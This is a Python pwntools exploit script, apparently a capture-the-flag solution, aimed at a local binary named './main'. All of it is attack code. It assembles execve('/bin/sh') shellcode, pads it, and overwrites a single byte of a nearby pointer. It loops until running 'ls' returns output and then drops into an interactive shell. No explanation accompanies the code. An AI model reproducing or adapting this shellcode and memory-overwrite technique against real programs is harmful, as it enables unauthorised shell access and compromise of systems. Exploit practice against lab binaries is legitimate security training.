from pwn import *

def attempt_exploit():
    context.binary = ELF('./main', checksec=False)
    
    while True:
        try:
            p = process()
            
            payload = asm("""
                mov rbx, 0x0068732f6e69622f
                push rbx
                mov rax, 0x3b
                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                syscall
                """)
            payload = payload.ljust(0x20, b'\x00')
            payload += b'\x40'  # buffer - 0x8
            
            p.clean()
            p.send(payload)
            
            sleep(0.5)
            p.sendline(b'ls')
            output = p.recv(timeout=1)
            
            if output:
                log.success("Successful exploit!")
                p.interactive()
                return True
                
            p.close()
            
        except:
            p.close()
            continue

if __name__ == "__main__":
    attempt_exploit()